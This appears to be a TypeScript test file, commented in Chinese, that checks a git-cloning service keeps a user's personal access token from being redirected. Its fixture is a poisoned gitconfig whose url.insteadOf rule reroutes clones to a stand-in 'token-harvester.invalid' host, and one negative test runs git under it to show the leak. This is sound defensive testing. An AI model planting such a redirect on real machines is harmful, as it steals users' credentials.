/**
 * 带个人令牌的 Git 动作不许受部署机全局配置摆布。
 *
 * 这条的锋利处在于:宿主的 credential helper 是"问什么答什么"的——
 * 它不看 git 传进来的 host,谁问都把用户的个人 CodeHub 令牌交出去。
 * 部署机 ~/.gitconfig 或 /etc/gitconfig 里一条
 * `url.<别处>.insteadOf` 就能把 clone 改道到另一台主机,令牌跟着走。
 *
 * 裁判用真 git:起一个本地裸仓当"正主",再用 insteadOf 把它改道到一个
 * 根本不存在的地址。没加固时 clone 会去改道后的地址(失败信息里带得到
 * 证据);加固后全局配置读不到,clone 照常落在正主上。
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { TaskService } from "../src/taskService.ts";

function git(args: string[], cwd?: string) {
  const run = spawnSync("git", args, { cwd, encoding: "utf-8" });
  if (run.status !== 0) {
    throw new Error(`git ${args.join(" ")} 失败: ${run.stderr}`);
  }
  return run.stdout;
}

/** 造一个本地裸仓当"正主"。 */
function originRepo(root: string): string {
  const work = join(root, "work");
  const bare = join(root, "origin.git");
  mkdirSync(work, { recursive: true });
  git(["init", "--quiet", "--initial-branch=master", work]);
  writeFileSync(join(work, "README.md"), "# fixture\n");
  git(["add", "."], work);
  git(["-c", "user.name=t", "-c", "user.email=t@t",
    "commit", "--quiet", "-m", "init"], work);
  git(["clone", "--quiet", "--bare", work, bare]);
  return bare;
}

function newService(dataDir: string) {
  return new TaskService({
    dataDir,
    provider: "fixture",
    model: "fixture",
    modelsJson: {},
    maxConcurrent: 0,
  }) as any;
}

// 令牌只对 https 远端有意义,所以改道也只在 https 源上才是真威胁。
// 用一个连不通的回环端口当"正主":两种情况都会失败,但**失败信息里
// 的地址**就是判据——去了 127.0.0.1 = 没被改道,去了改道目标 = 令牌
// 已经递到别人手上。
const HTTPS_ORIGIN = "https://127.0.0.1:1/fixture.git";
const POISON = "[url \"https://token-harvester.invalid/\"]\n"
  + "\tinsteadOf = https://127.0.0.1:1/\n";

test("带令牌 clone 不读部署机全局配置:insteadOf 改道不了,令牌带不走", () => {
  const root = mkdtempSync(join(tmpdir(), "mfc-clone-boundary-"));
  const poisoned = join(root, "poisoned.gitconfig");
  writeFileSync(poisoned, POISON);

  const service = newService(join(root, "data"));
  const sandbox = service.prepareHostGitSandbox(
    { username: "u", password: "s3cret" });
  // 沙箱之外的一切都指向被污染的配置:加固没生效的话改道必然发生。
  const before = process.env.GIT_CONFIG_GLOBAL;
  process.env.GIT_CONFIG_GLOBAL = poisoned;
  try {
    const target = join(root, "cloned");
    mkdirSync(target, { recursive: true });
    assert.throws(
      () => service.cloneRepo(target, sandbox, { username: "u" }, HTTPS_ORIGIN),
      (error: unknown) => {
        const detail = String((error as Error).message);
        assert.equal(detail.includes("token-harvester.invalid"), false,
          "加固沙箱下不能被 insteadOf 改道——改道就等于把个人令牌递给别人");
        assert.match(detail, /127\.0\.0\.1/,
          "必须还是奔着原地址去的");
        return true;
      });
  } finally {
    if (before === undefined) delete process.env.GIT_CONFIG_GLOBAL;
    else process.env.GIT_CONFIG_GLOBAL = before;
    service.cleanupHostGitCredential(sandbox);
  }
});

test("负例守卫:同一份污染配置在没有加固时确实会改道(证明这测的是真东西)", () => {
  const root = mkdtempSync(join(tmpdir(), "mfc-clone-negative-"));
  const poisoned = join(root, "poisoned.gitconfig");
  writeFileSync(poisoned, POISON);

  const run = spawnSync("git", [
    "clone", "--quiet", "--", HTTPS_ORIGIN, join(root, "naive"),
  ], {
    encoding: "utf-8",
    env: { ...process.env, GIT_CONFIG_GLOBAL: poisoned, GIT_TERMINAL_PROMPT: "0" },
  });
  assert.notEqual(run.status, 0);
  assert.match(`${run.stderr}`, /token-harvester\.invalid/,
    "不加固时 git 真的会去改道后的地址;这条一旦变绿,上面那条就失去意义");
});

test("本地仓克隆照常可用:没有令牌可泄,也不该被加固顺手弄坏", () => {
  const root = mkdtempSync(join(tmpdir(), "mfc-clone-local-"));
  const bare = originRepo(root);
  const service = newService(join(root, "data"));
  const target = join(root, "cloned");
  mkdirSync(target, { recursive: true });
  const cwd = service.cloneRepo(target, undefined, undefined, bare, "master");
  assert.equal(existsSync(join(cwd, "README.md")), true);
  const config = git(["config", "--local", "--list"], cwd);
  assert.equal(config.includes("credential.helper"), false,
    "临时 helper 不能被写进克隆出来的仓");
});

test("临时凭据目录用完即删,令牌不留在盘上", () => {
  const root = mkdtempSync(join(tmpdir(), "mfc-clone-cleanup-"));
  const service = newService(join(root, "data"));
  const sandbox = service.prepareHostGitSandbox(
    { username: "u", password: "s3cret" });
  assert.equal(existsSync(sandbox.dir), true);
  service.cleanupHostGitCredential(sandbox);
  assert.equal(existsSync(sandbox.dir), false);
});
